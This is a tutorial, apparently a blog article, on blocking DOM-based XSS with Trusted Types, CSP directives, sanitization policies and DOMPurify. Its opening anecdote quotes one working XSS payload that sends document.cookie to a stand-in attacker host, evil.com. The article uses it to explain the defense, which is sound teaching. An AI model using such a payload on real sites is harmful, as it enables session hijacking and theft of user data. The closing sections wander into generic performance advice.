---
title: "Stopping XSS with Trusted Types"
slug: "xss-prevention-csp-trusted-types"
description: "Prevent DOM-based XSS with Trusted Types and Content Security Policy: require-trusted-types-for, trusted type policies, and sanitizing dynamic content."
datePublished: "2026-05-28"
dateModified: "2026-05-28"
tags: ["Security", "XSS", "CSP", "Frontend"]
keywords: "Trusted Types, XSS prevention, Content Security Policy, DOM XSS, trustedTypes, require-trusted-types-for"
faq:
  - q: "What types of XSS does Trusted Types prevent?"
    a: "Trusted Types prevents DOM-based XSS — attacks where attacker-controlled strings reach dangerous DOM sinks like innerHTML, eval, document.write, and script.src. It does not prevent stored or reflected XSS that the server renders into the page. Combine Trusted Types with server-side output encoding and CSP script-src restrictions for comprehensive XSS defense."
  - q: "What happens when Trusted Types is enforced and code uses innerHTML directly?"
    a: "The browser throws a TypeError: 'This document requires TrustedHTML assignment.' Any call to innerHTML, outerHTML, insertAdjacentHTML, or similar sinks with a plain string fails. Code must create a TrustedHTML object through a registered policy first. This breaks existing code that assigns unsanitized strings — which is the point."
  - q: "Can I use Trusted Types with third-party libraries?"
    a: "Third-party libraries that set innerHTML internally will break under enforcement unless they support Trusted Types or you wrap their output. Libraries like DOMPurify ship Trusted Types policies. For libraries that don't, create a default policy that sanitizes all HTML, or use report-only mode while auditing which libraries need updates."
---

A DOM XSS vulnerability in our search feature passed user input directly to `innerHTML` to highlight matches. An attacker searched for `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` and stole session tokens. Trusted Types would have blocked the assignment at runtime — no string reaches `innerHTML` without passing through a sanitization policy.

## How Trusted Types works

Trusted Types wraps dangerous DOM sinks. Instead of accepting strings, sinks accept typed objects created by registered policies:

```javascript
// Without Trusted Types — vulnerable
element.innerHTML = userInput;

// With Trusted Types — must use a policy
const policy = trustedTypes.createPolicy('sanitize', {
  createHTML: (input) => DOMPurify.sanitize(input),
});

element.innerHTML = policy.createHTML(userInput);
// If userInput contains <script>, DOMPurify strips it
```

Policies are the only way to create TrustedHTML, TrustedScript, and TrustedScriptURL objects.

## CSP enforcement

Enable via Content-Security-Policy header:

```
Content-Security-Policy:
  require-trusted-types-for 'script';
  trusted-types sanitize default;
```

| Directive | Effect |
|---|---|
| `require-trusted-types-for 'script'` | Enforces Trusted Types on all script-related sinks |
| `trusted-types sanitize default` | Allows policies named "sanitize" and a "default" policy |

Start with report-only to find violations without breaking production:

```
Content-Security-Policy-Report-Only:
  require-trusted-types-for 'script';
  report-uri /csp-report;
```

## Creating policies

```javascript
if (window.trustedTypes && trustedTypes.createPolicy) {
  // HTML sanitization policy
  trustedTypes.createPolicy('sanitize', {
    createHTML: (string) => {
      return DOMPurify.sanitize(string, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href', 'class'],
      });
    },
  });

  // Script URL validation policy
  trustedTypes.createPolicy('scripts', {
    createScriptURL: (url) => {
      const parsed = new URL(url, document.baseURI);
      if (parsed.origin !== location.origin) {
        throw new TypeError('External scripts not allowed');
      }
      return parsed.href;
    },
  });
}
```

Register policies before any code that uses DOM sinks — in the first script in `<head>`.

## Default policy

Catch-all for third-party libraries:

```javascript
trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (url) => {
    if (url.startsWith('/') || url.startsWith(location.origin)) {
      return url;
    }
    throw new TypeError(`Untrusted script URL: ${url}`);
  },
  createScript: () => {
    throw new TypeError('Inline scripts not allowed');
  },
});
```

The default policy handles sinks from libraries you don't control.

## Sinks protected by Trusted Types

| Sink | Trusted Type |
|---|---|
| `element.innerHTML` | TrustedHTML |
| `element.outerHTML` | TrustedHTML |
| `document.write()` | TrustedHTML |
| `eval()` | TrustedScript |
| `new Function()` | TrustedScript |
| `script.src` | TrustedScriptURL |
| `iframe.src` | TrustedScriptURL |

## Migration strategy

1. **Report-only CSP** — collect violations for two weeks
2. **Audit violations** — categorize by source (your code vs. libraries)
3. **Create policies** — one for each sanitization need
4. **Fix application code** — replace direct innerHTML with policy.createHTML
5. **Update libraries** — upgrade to Trusted Types-compatible versions
6. **Enforce** — switch from Report-Only to enforcing CSP

Common fixes:

```javascript
// Before
container.innerHTML = template.render(data);

// After
container.innerHTML = sanitizePolicy.createHTML(template.render(data));

// Better: avoid innerHTML entirely
container.replaceChildren(template.renderElement(data));
```

Prefer DOM APIs (`textContent`, `createElement`, `replaceChildren`) over HTML string assignment when possible.

## DOMPurify integration

DOMPurify supports Trusted Types natively:

```javascript
import DOMPurify from 'dompurify';

const policy = trustedTypes.createPolicy('dompurify', {
  createHTML: (string) => DOMPurify.sanitize(string),
});

// DOMPurify can also return TrustedHTML directly
DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });
```

## Limitations

Trusted Types does not protect against:
- Server-side XSS (sanitize on output)
- CSS injection via style attributes
- Prototype pollution leading to sink bypass
- Browser extensions modifying the page

Layer defenses: Trusted Types + CSP script-src + server encoding + HttpOnly cookies.

## CSP report-uri integration

Collect Trusted Types violations alongside CSP reports:

```
Content-Security-Policy-Report-Only:
  require-trusted-types-for 'script';
  report-uri /csp-report;
  report-to csp-endpoint;
```

Analyze reports to find libraries and code paths that need policies before enforcement breaks production.

## sanitize-html vs. DOMPurify

Both work with Trusted Types. DOMPurify is browser-native; sanitize-html runs on the server for SSR. Apply the same allowlist on server and client to prevent mismatched sanitization between rendered HTML and client-side updates.

## Measuring success in production

Deploy changes behind feature flags when possible so you can compare metrics between control and treatment groups. Use Real User Monitoring to capture performance data from actual devices and network conditions — lab tools alone miss the long tail of user experiences. Set up alerts for regressions: a 10% LCP increase week-over-week warrants investigation before it hits CrUX.

Document your baseline metrics before making changes. Performance work without measurement is guesswork. Share results with the team — concrete numbers ("LCP improved 800ms on mobile") build support for continued investment in web performance and reliability.

Review changes quarterly. Browser updates, new API support, and traffic pattern shifts can obsolete previous optimizations or create new opportunities. What worked in 2024 may not be the best approach in 2026.

## Additional production considerations

Teams often underestimate the maintenance cost of performance optimizations. Automate what you can: CI bundle budgets, Lighthouse CI on PRs, and RUM dashboards that alert on regressions. Manual audits don't scale past a handful of pages.

Security and performance intersect more than teams expect. Third-party scripts that hurt INP also expand your attack surface. Self-hosting fonts and critical assets reduces both latency and supply-chain risk. Review every external dependency quarterly — remove what you no longer need.

Accessibility and performance share goals: semantic HTML helps screen readers and gives the browser better rendering hints. Native elements like dialog, popover, and details reduce JavaScript while improving accessibility. Prefer platform features over custom implementations when they meet your requirements.

Mobile users dominate traffic for most sites. Test on real mid-tier Android hardware, not just desktop Chrome. Simulated throttling in DevTools approximates network conditions but not CPU constraints. A fix that helps desktop may be invisible on mobile if the bottleneck is JavaScript execution, not network.

Collaborate with backend teams on TTFB and API response times. Frontend optimizations can't fix a 2-second server response. Set SLAs for API endpoints that feed critical pages and measure them in the same RUM pipeline as Core Web Vitals.

## Resources

- [Trusted Types specification (W3C)](https://w3c.github.io/trusted-types/dist/spec/)
- [MDN: Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)
- [web.dev: Trusted Types](https://web.dev/articles/trusted-types)
- [DOMPurify Trusted Types support](https://github.com/cure53/DOMPurify/wiki/Trusted-Types)
- [Can I use Trusted Types](https://caniuse.com/trusted-types)
